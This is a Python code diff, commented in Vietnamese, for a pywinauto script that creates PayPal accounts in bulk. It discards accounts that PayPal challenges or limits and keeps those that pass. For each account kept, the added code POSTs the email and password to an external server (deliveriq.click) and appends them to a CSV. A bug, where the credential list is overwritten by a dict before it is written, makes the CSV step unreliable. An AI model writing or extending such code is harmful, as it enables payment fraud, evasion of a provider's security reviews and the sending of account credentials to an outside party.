@@ -4,10 +4,13 @@ load_dotenv()
 GLOBAL_API_LINK = os.getenv("GLOBAL_API_LINK")
 GLOBAL_PASSWORD = os.getenv("GLOBAL_PASSWORD")
 PATH_PROFILE = os.getenv("PATH_PROFILE")
-if not GLOBAL_API_LINK or not GLOBAL_PASSWORD or not PATH_PROFILE:
+KEY_GEN_MAIL = os.getenv("KEY_GEN_MAIL")
+if not GLOBAL_API_LINK or not GLOBAL_PASSWORD or not PATH_PROFILE or not KEY_GEN_MAIL:
     print("Vui lòng kiểm tra lại thông tin trong file .env")
     exit()
-
+import sys
+sys.path.insert(0, 'tools')  # Thêm thư mục 'dist' vào đường dẫn tìm module
+import gen_mail
 from pywinauto.application import Application
 from pywinauto import findwindows
 import time
@@ -22,6 +25,7 @@ import threading
 import re
 import requests
 from pywinauto.keyboard import send_keys
+from datetime import datetime
 import pyautogui
 import csv
 from rand_info import generate_cccd
@@ -66,7 +70,7 @@ def check_security_challenge(window,email):
         )
         element.wrapper_object()  # Nếu không tồn tại sẽ raise lỗi
         print("Phát hiện Security Challenge")
-        # find_and_click_button(email,window, title="Restart", auto_id="btn_restart", control_type="Button")
+        click_create_acc(window,auto_id="btn_restart", control_type="Button")
         time.sleep(2)
         delete_folder(email) # xóa profile
         return True
@@ -191,46 +195,70 @@ def runn(email, password):
         
         go_to_url(window,"https://paypal.com")
 
-        # try:
-        #     # Thử tìm Hyperlink
-        #     hyperlink = window.child_window(
-        #         title_re="^Submit info to access your funds.*",
-        #         control_type="Hyperlink"
-        #     )
-        #     hyperlink.wrapper_object()  # Nếu không có sẽ raise lỗi
+        try:
+            # Thử tìm Hyperlink
+            hyperlink = window.child_window(
+                title_re="^Submit info to access your funds.*",
+                control_type="Hyperlink"
+            )
+            hyperlink.wrapper_object()  # Nếu không có sẽ raise lỗi
 
-        #     print("Tài khoản lỗi")
+            print("Tài khoản lỗi")
 
-        #     find_and_click_button(email,window, title="Restart", auto_id="btn_restart", control_type="Button")
-        #     time.sleep(6)
-        #     delete_folder(email) # xóa profile
+            click_create_acc(window,auto_id="btn_restart", control_type="Button")
+            time.sleep(6)
+            delete_folder(email) # xóa profile
             
 
-        # except ElementNotFoundError:
-        #     print("Tài khoản thành công")
-        #     time.sleep(2)
-        #     find_and_click_button(email,window,title="Settings", auto_id="header-settings", control_type="Hyperlink")
-        #     time.sleep(4)
-        #     find_and_click_button(email,window,title="Confirm Your Email", auto_id="interstitial-button-1", control_type="Button")
-        #     time.sleep(3)
+        except ElementNotFoundError:
+            try:
+                # Thử tìm Hyperlink
+                hyperlink = window.child_window(
+                    title="We're permanently limiting your account. You can no longer use PayPal as we've decided to permanently limit your account after a review.",
+                    control_type="Hyperlink"
+                )
+                hyperlink.wrapper_object()  # Nếu không có sẽ raise lỗi
+                print("Tài khoản lỗi limit")
+                click_create_acc(window,auto_id="btn_restart", control_type="Button")
+                time.sleep(6)
+                delete_folder(email) # xóa profile
+            except ElementNotFoundError:
+                print("Tài khoản thành công")
+                time.sleep(2)
+                find_and_interact_with_control(window, "Hyperlink", "header-settings", "click")
+                time.sleep(4)
+                find_and_interact_with_control(window, "Button", "interstitial-button-1", "click")
+                time.sleep(3)
 
-        #     verify_email(window)
-        #     time.sleep(5)
-        #     data = [
-        #         [email, password]
-        #     ]
-        #     with open('data.csv', mode='a', newline='', encoding='utf-8') as file:
-        #         writer = csv.writer(file)
-        #         writer.writerows(data)
+                verify_email(window)
+                
+                data = [
+                    [email, password]
+                ]
+                url = "http://deliveriq.click/api/append"  # Thay bằng domain thực tế nếu cần
+                key = gen_mail.decode(KEY_GEN_MAIL)
+                data = {
+                    "ten": key,
+                    "thoigian": datetime.now().strftime("%H:%M_%d/%m/%Y"),
+                    "email": email,
+                    "pass": password
+                }
+                try:
+                    requests.post(url, json=data)
+                except Exception as e:
+                    print("Liên Hệ Tuấn Ngay !!!!")
 
-        #     find_and_click_button(email,window, title="Restart", auto_id="btn_restart", control_type="Button")
-        #     time.sleep(5)
-        # # loginn = child_window(title="All done? We’ll log you out in a few moments. Stay Logged In", control_type="Group")
-        # # loginn.click_input()
+                with open('data.csv', mode='a', newline='', encoding='utf-8') as file:
+                    writer = csv.writer(file)
+                    writer.writerows(data)
+                time.sleep(5)
+                click_create_acc(window,auto_id="btn_restart", control_type="Button")
+                time.sleep(5)
+
 
     except Exception as e:
         print(f"Lỗi trong quá trình thực hiện: {e}")
-        # find_and_click_button(email,window, title="Restart", auto_id="btn_restart", control_type="Button")
+        click_create_acc(window,auto_id="btn_restart", control_type="Button")
         time.sleep(5)
         delete_folder(email) # xóa profile
     finally:
@@ -333,7 +361,10 @@ def start_watcher():
     current_thread = threading.Thread(target=reader_thread_fn, args=(current_process,), daemon=True)
     current_thread.start()
 
-
+key = gen_mail.decode(KEY_GEN_MAIL)
+if key is None:
+    print("Generate email thất bại do sai KEY")
+    exit(0)
 while True:
     while True: 
         status = reset_server()
